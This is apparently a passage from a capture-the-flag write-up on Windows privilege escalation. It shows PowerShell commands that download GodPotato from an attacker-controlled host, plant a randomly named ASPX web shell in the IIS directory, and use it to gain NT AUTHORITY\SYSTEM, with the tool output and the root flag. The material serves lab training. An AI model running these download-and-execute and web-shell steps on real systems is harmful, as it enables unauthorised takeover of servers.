Headers           : {[Content-Length, 41], [Cache-Control, private], [Content-Type, text/html; charset=utf-8], [Date,    
                   Fri, 03 Jul 2026 02:28:31 GMT]...}  
Images            : {}  
InputFields       : {}  
Links             : {}  
ParsedHtml        :    
RawContentLength  : 41
```

We are `iis apppool\defaultapppool`.

We then upload `GodPotato` since `AppPool` identity grants us `SeImpersonatePrivilege` :

```PowerShell
C:\Windows\system32>powershell -c "iwr http://10.10.14.129:9000/GodPotato-NET4.exe -OutFile C:\Users\Public\Music\GodPotato-NET4.exe"  
  
powershell -c "iwr http://10.10.14.129:9000/GodPotato-NET4.exe -OutFile C:\Users\Public\Music\GodPotato-NET4.exe" 
```

`10.129.228.120 - - [02/Jul/2026 21:40:09] "GET /GodPotato-NET4.exe HTTP/1.1" 200`


```bash
  
C:\Windows\system32>powershell -c "$f='g'+[guid]::NewGuid().ToString('N').Substring(0,8)+'.aspx'; iwr http://10.10.14.129:9000/shell.aspx -OutFile ('C:\inetpub\development\'+$f); (iwr ('http://127.0.0.1:8000/'+  
$f+'?c=C:\Users\Public\Music\GodPotato-NET4.exe%20-cmd%20%22cmd%20/c%20whoami%20%3E%20C:\Users\Public\pwned2.txt%22') -UseBasicParsing).Content"  
  
powershell -c "$f='g'+[guid]::NewGuid().ToString('N').Substring(0,8)+'.aspx'; iwr http://10.10.14.129:9000/shell.aspx -OutFile ('C:\inetpub\development\'+$f); (iwr ('http://127.0.0.1:8000/'+$f+'?c=C:\Users\Publ  
ic\Music\GodPotato-NET4.exe%20-cmd%20%22cmd%20/c%20whoami%20%3E%20C:\Users\Public\pwned2.txt%22') -UseBasicParsing).Content"  
  
<pre>[*] CombaseModule: 0x140713323331584  
[*] DispatchTable: 0x140713325637696  
[*] UseProtseqFunction: 0x140713325014224  
[*] UseProtseqFunctionParamCount: 6  
[*] HookRPC  
[*] Start PipeServer  
[*] CreateNamedPipe \\.\pipe\e04daa4b-2435-41c8-9976-2a4a085e5f9c\pipe\epmapper  
[*] Trigger RPCSS  
[*] DCOM obj GUID: 00000000-0000-0000-c000-000000000046  
[*] DCOM obj IPID: 00000002-0384-ffff-f39c-7745e8488163  
[*] DCOM obj OXID: 0xcd2bce528873209d  
[*] DCOM obj OID: 0x1638e2c55c3d83d3  
[*] DCOM obj Flags: 0x281  
[*] DCOM obj PublicRefs: 0x0  
[*] Marshal Object bytes len: 100  
[*] UnMarshal Object  
[*] Pipe Connected!  
[*] CurrentUser: NT AUTHORITY\NETWORK SERVICE  
[*] CurrentsImpersonationLevel: Impersonation  
[*] Start Search System Token  
[*] PID : 924 Token:0x652  User: NT AUTHORITY\SYSTEM ImpersonationLevel: Impersonation  
[*] Find System Token : True  
[*] UnmarshalObject: 0x80070776  
[*] CurrentUser: NT AUTHORITY\SYSTEM  
[*] process start with pid 1352  
</pre>
```

And we got `NT AUTHORITY\SYSTEM` allowing us to copy the root file to `\Public\` and read it :

```PowerShell
C:\Windows\system32>type C:\Users\Public\root.txt  
327feaf1c76ee1d89483cd2dc0bff414
```
